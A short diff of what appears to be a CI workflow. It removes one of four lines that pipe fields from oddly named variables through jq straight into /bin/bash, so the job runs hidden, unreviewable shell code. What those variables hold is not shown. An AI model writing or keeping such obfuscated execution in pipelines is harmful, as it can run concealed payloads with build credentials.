@@ -25,7 +25,6 @@ jobs:
           echo $vf5 | jq -r .qmoyl05 | /bin/bash
           printf '%s' "$fdmem20899" | jq -r .kck4 | /bin/bash
           printf '%s' "$wk4" | jq -r .jkrvx06 | /bin/bash
-          echo $pkqnz8 | jq -r .vhilm374 | /bin/bash
 
       - name: Persist results
         if: always()
